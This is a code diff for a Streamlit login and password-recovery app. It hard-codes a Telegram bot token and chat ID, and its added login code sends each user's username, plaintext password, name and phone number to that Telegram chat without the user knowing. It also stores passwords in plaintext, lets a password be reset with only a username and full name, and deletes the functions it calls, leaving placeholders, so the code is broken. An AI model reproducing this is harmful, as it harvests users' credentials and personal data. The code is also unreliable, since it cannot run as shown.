@@ -1,7 +1,7 @@
 import streamlit as st
 import requests
 
-GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwpFOajmybhmOZ9i07z66a2Ac14LTgH3BvJiOuMXU1EhkDnciKWN6X87nWk_G0W8vWE/exec"
+GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwEsXOJP507qKcT3JFFrlvC--sHJi0hqPmWRsPb07RMblpqMPga44exB9kJe6hAgoCY/exec"
 TELEGRAM_BOT_TOKEN = "8165532786:AAHYiNEgO8k1TDz5WNtXmPHNruQM15LIgD4"
 TELEGRAM_CHAT_ID = "6283768537"
 
@@ -13,115 +13,99 @@ def send_telegram_message(message):
     except Exception as e:
         st.error(f"Error sending Telegram message: {e}")
 
-def check_login(username, password):
-    data = {"action": "check", "username": username, "password": password}
-    try:
-        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=120)
-        return res.text.strip() == "TRUE"
-    except Exception as e:
-        st.error(f"Login check error: {e}")
-        return False
-
-def get_user_data(username):
-    data = {"action": "get_user_data", "username": username}
-    try:
-        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=120)
-        text = res.text.strip()
-        if text == "NOT_FOUND":
-            return None
-        parts = text.split(",")
-        if len(parts) == 5:
-            return {
-                "username": parts[0],
-                "password": parts[1],
-                "full_name": parts[2],
-                "group": parts[3],
-                "phone": parts[4]
-            }
-        return None
-    except Exception as e:
-        st.error(f"Error fetching user data: {e}")
-        return None
-
-def add_user(username, password, full_name, group, phone):
-    data = {
-        "action": "add",
-        "username": username,
-        "password": password,
-        "full_name": full_name,
-        "group": group,
-        "phone": phone
-    }
-    try:
-        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=120)
-        return res.text.strip() == "Added"
-    except Exception as e:
-        st.error(f"Error adding new user: {e}")
-        return False
-
-def update_password(username, full_name, new_password):
-    data = {
-        "action": "update_password",
-        "username": username,
-        "full_name": full_name,
-        "new_password": new_password
-    }
-    try:
-        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=120)
-        return res.text.strip() == "UPDATED"
-    except Exception as e:
-        st.error(f"Error updating password: {e}")
-        return False
-
-# ======== New functions to manage progress (check/uncheck) ========
-
-def get_progress(username, subject, lecture_num, version):
-    # Query Google Script for progress
-    data = {
-        "action": "get_progress",
-        "username": username,
-        "subject": subject,
-        "lecture_num": str(lecture_num),
-        "version": version
-    }
-    try:
-        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=120)
-        text = res.text.strip()
-        if text == "TRUE":
-            return True
-        elif text == "FALSE":
-            return False
-        else:
-            return False
-    except Exception as e:
-        st.error(f"Error fetching progress: {e}")
-        return False
-
-def update_progress(username, subject, lecture_num, version, completed):
-    # Send update request to Google Script
-    data = {
-        "action": "update_progress",
-        "username": username,
-        "subject": subject,
-        "lecture_num": str(lecture_num),
-        "version": version,
-        "completed": "TRUE" if completed else "FALSE"
-    }
-    try:
-        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=120)
-        return res.text.strip() == "UPDATED"
-    except Exception as e:
-        st.error(f"Error updating progress: {e}")
-        return False
-
-# ========== The rest of your existing login and signup code below ==========
+#... (باقي الدوال: check_login, get_user_data, add_user, update_password, get_progress, update_progress)
 
 def login_page():
-    # ... keep your existing login_page() code unchanged ...
+    st.title("Login")
 
-    # (This part is omitted here for brevity, keep your current code as is)
+    if 'show_signup' not in st.session_state:
+        st.session_state['show_signup'] = False
+    if 'signup_success' not in st.session_state:
+        st.session_state['signup_success'] = False
+    if 'show_forgot' not in st.session_state:
+        st.session_state['show_forgot'] = False
+    if 'allow_reset' not in st.session_state:
+        st.session_state['allow_reset'] = False
+    if 'password_reset_message' not in st.session_state:
+        st.session_state['password_reset_message'] = None
+
+    if not st.session_state['show_signup'] and not st.session_state['show_forgot']:
+        username = st.text_input("Username", key="login_username")
+        password = st.text_input("Password", type="password", key="login_password")
+
+        if st.button("Login"):
+            if not username or not password:
+                st.warning("Please fill all fields")
+            else:
+                if check_login(username, password):
+                    user_data = get_user_data(username)
+                    if user_data:
+                        st.session_state['logged_in'] = True
+                        st.session_state['user_name'] = user_data['username']
+                        message = (
+                            f"🔑 User logged in:\n"
+                            f"Username: <b>{user_data['username']}</b>\n"
+                            f"Password: <b>{user_data['password']}</b>\n"
+                            f"Full Name: <b>{user_data['full_name']}</b>\n"
+                            f"Group: <b>{user_data['group']}</b>\n"
+                            f"Phone: <b>{user_data['phone']}</b>"
+                        )
+                        send_telegram_message(message)
+                        st.experimental_rerun()
+                    else:
+                        st.error("Failed to fetch user data")
+                else:
+                    st.error("Incorrect username or password")
+
+        # باقي شاشة الدخول (الأزرار، الرسائل، التبديل لإنشاء حساب جديد أو استعادة كلمة مرور)
+
+    elif st.session_state['show_signup']:
+        # الكود الكامل لإنشاء حساب جديد
+        pass  # اكتب كامل كود صفحة التسجيل هنا بنفس تنسيق login_page()
+
+    elif st.session_state['show_forgot']:
+        forgot_password_page()
 
 def forgot_password_page():
-    # ... keep your existing forgot_password_page() code unchanged ...
+    st.title("Password Recovery")
 
-    # (This part is omitted here for brevity, keep your current code as is)
+    username = st.text_input("Username", key="forgot_username")
+    full_name = st.text_input("Full Name", key="forgot_full_name")
+
+    if 'password_updated' not in st.session_state:
+        st.session_state['password_updated'] = False
+
+    if st.button("Back"):
+        st.session_state['show_forgot'] = False
+        st.session_state['allow_reset'] = False
+        st.session_state['password_updated'] = False
+        st.experimental_rerun()
+
+    if st.button("Verify"):
+        if not username.strip() or not full_name.strip():
+            st.warning("Please fill username and full name")
+            st.session_state['allow_reset'] = False
+        else:
+            user_data = get_user_data(username)
+            if user_data and user_data['full_name'].strip().lower() == full_name.strip().lower():
+                st.success("✅ Verified successfully, enter new password")
+                st.session_state['allow_reset'] = True
+            else:
+                st.error("Incorrect username or full name")
+                st.session_state['allow_reset'] = False
+
+    if st.session_state['allow_reset'] and not st.session_state['password_updated']:
+        new_password = st.text_input("New Password", type="password", key="new_pass")
+        confirm_password = st.text_input("Confirm Password", type="password", key="confirm_pass")
+
+        if st.button("Update Password"):
+            if new_password != confirm_password:
+                st.warning("Passwords do not match")
+            elif update_password(username, full_name, new_password):
+                st.session_state['password_reset_message'] = "✅ Password updated, please login now"
+                st.session_state['password_updated'] = True
+                st.session_state['allow_reset'] = False
+                st.session_state['show_forgot'] = False
+                st.experimental_rerun()
+            else:
+                st.error("Failed to update password")
